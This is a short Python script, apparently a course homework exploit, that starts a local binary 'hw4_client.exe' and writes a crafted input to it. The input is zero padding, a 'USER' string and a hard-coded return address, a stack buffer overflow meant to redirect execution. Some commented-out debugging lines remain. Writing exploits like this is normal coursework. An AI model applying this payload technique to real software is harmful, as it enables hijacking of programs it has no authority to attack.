import socket
import sys
import subprocess
from subprocess import PIPE
from time import sleep

proc = subprocess.Popen(['./hw4_client.exe'], stdin=PIPE)
desiredCode = 'USER'
desiredUSERNAME = 'USER\n'
desiredCodeHex = str.encode(desiredUSERNAME)
proc.stdin.write(desiredCodeHex)
preMenu =  '00' * 32
postMenu = '00' * 36
#breakpoint()  # drop into the debugger at this point
first_attack = bytearray.fromhex(preMenu) + str.encode(desiredCode) + bytearray.fromhex(postMenu) + bytearray.fromhex('AE1C4000') +str.encode('\n')

#print(first_attack)
proc.stdin.write(first_attack)
input()
#sleep(60)
#print("end")
#proc.stdin.flush()
#proc.write(input=first_attack)

